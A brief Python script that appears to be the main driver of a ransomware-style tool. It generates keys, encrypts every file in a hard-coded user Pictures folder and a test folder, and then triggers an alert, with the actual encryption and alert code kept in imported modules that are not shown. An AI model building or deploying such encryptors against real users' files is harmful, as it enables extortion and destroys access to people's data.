from encriptFIles import encript
import generateKeys
import alert
generateKeys.do()
encrypt=encript()
folders=[r"C:\Users\Laptop Markazi\Pictures\photoshop","testFolder"]
for folder in folders:
    succes=encrypt.encrypt_files(folder_path=folder)
if succes:
    alert.do()
